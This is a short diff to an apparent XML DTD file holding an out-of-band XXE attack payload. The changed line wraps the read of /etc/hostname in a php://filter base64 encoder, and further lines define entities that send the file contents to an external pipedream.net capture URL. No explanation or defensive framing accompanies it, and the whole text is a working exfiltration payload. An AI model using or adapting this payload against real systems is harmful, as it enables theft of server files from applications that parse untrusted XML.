@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY exfiltrate SYSTEM 'https://eotad3zugug90z.m.pipedream.net/%file;'>">
 %eval;
 %exfiltrate;
